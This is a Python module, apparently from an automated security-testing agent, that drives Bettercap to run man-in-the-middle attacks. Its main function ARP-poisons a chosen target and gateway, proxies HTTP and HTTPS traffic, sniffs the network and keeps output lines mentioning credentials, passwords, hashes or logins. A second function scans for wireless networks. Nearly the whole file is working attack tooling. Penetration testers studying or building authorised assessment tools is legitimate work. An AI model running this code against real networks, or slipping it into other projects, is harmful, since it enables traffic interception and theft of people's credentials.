"""
Bettercap network sniffing/manipulation integration for the Dynamic Analysis Agent.

Bettercap is a powerful, flexible and portable tool created to perform various
types of MITM attacks against a network, manipulate HTTP, HTTPS and TCP traffic
in realtime and sniff for credentials.

This integration performs network attacks including:
- ARP spoofing and poisoning
- DNS spoofing
- HTTP/HTTPS proxy interception
- SSL stripping
- Network sniffing and monitoring
- Wireless network attacks
- Credential harvesting

Used for:
- Man-in-the-middle attacks during testing
- Network traffic analysis
- Credential interception
- Wireless security assessment
"""

import subprocess
import threading
import time
import signal
import os

def perform_bettercap_mitm(target_ip=None, gateway_ip=None, interface=None, duration=60):
    """
    Perform Bettercap MITM attack.

    Args:
        target_ip (str): Target IP for ARP poisoning
        gateway_ip (str): Gateway IP for ARP poisoning
        interface (str): Network interface
        duration (int): Duration to run attack in seconds

    Returns:
        dict: MITM results
    """
    try:
        print(f"\nRunning Bettercap MITM attack for {duration}s...")

        # Build command
        cmd = ['bettercap']

        if interface:
            cmd.extend(['-iface', interface])

        # Set up ARP spoofing
        if target_ip and gateway_ip:
            cmd.extend(['-T', target_ip, '-G', gateway_ip])

        # Enable modules for credential sniffing
        cmd.extend(['--proxy-https', '--proxy-http', '--sniffer'])

        print(f"Running command: {' '.join(cmd)}")

        # Start Bettercap in background
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            preexec_fn=os.setsid if hasattr(os, 'setsid') else None
        )

        # Monitor output
        captured_data = []
        start_time = time.time()

        while time.time() - start_time < duration:
            if process.poll() is not None:
                break

            # Read stdout
            output = process.stdout.readline()
            if output:
                print(f"Bettercap: {output.strip()}")
                # Look for interesting captures
                if any(keyword in output.lower() for keyword in ['credential', 'password', 'hash', 'login']):
                    captured_data.append({
                        'timestamp': time.time(),
                        'output': output.strip()
                    })

            time.sleep(0.1)

        # Stop the process
        try:
            if hasattr(os, 'killpg'):
                os.killpg(os.getpgid(process.pid), signal.SIGTERM)
            else:
                process.terminate()
            process.wait(timeout=10)
        except:
            process.kill()

        print("Bettercap MITM attack completed.")

        return {
            "output": "Bettercap session completed",
            "captured_data": captured_data,
            "capture_count": len(captured_data),
            "target_ip": target_ip,
            "gateway_ip": gateway_ip,
            "interface": interface,
            "duration": duration,
            "success": True,
            "timestamp": time.time()
        }

    except FileNotFoundError:
        print("Bettercap not installed. Skipping MITM attack.")
        return None
    except Exception as e:
        print(f"Error during Bettercap MITM: {e}")
        return {
            "error": str(e),
            "target_ip": target_ip,
            "success": False,
            "timestamp": time.time()
        }

def perform_bettercap_wireless_scan(interface=None, duration=30):
    """
    Perform wireless network scanning with Bettercap.

    Args:
        interface (str): Wireless interface
        duration (int): Scan duration in seconds

    Returns:
        dict: Wireless scan results
    """
    try:
        print(f"\nRunning Bettercap wireless scan on {interface} for {duration}s...")

        cmd = ['bettercap', '-iface', interface] if interface else ['bettercap']
        cmd.append('--wifi')

        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            preexec_fn=os.setsid if hasattr(os, 'setsid') else None
        )

        # Collect output
        networks = []
        start_time = time.time()

        while time.time() - start_time < duration:
            if process.poll() is not None:
                break

            output = process.stdout.readline()
            if output:
                print(f"Bettercap WiFi: {output.strip()}")
                if 'wifi.ap.new' in output or 'BSSID' in output:
                    networks.append(output.strip())

            time.sleep(0.1)

        # Stop process
        try:
            if hasattr(os, 'killpg'):
                os.killpg(os.getpgid(process.pid), signal.SIGTERM)
            else:
                process.terminate()
            process.wait(timeout=10)
        except:
            process.kill()

        return {
            "output": "Wireless scan completed",
            "networks": networks,
            "network_count": len(networks),
            "interface": interface,
            "duration": duration,
            "success": True,
            "timestamp": time.time()
        }

    except Exception as e:
        print(f"Error during wireless scan: {e}")
        return {
            "error": str(e),
            "interface": interface,
            "success": False,
            "timestamp": time.time()
        }
